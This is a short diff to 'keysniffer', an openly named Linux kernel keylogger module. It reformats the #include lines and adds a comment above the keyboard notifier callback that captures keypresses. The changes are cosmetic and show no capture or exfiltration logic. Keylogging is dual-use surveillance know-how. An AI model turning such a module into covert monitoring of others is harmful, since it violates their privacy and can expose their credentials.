@@ -18,10 +18,10 @@
  * along with keysniffer. If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include<linux/init.h>
-#include<linux/kernel.h>
-#include<linux/module.h>
-#include<linux/keyboard.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/keyboard.h>
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
@@ -72,6 +72,7 @@ static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
 
+/* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
 	struct keyboard_notifier_param *param = _param;
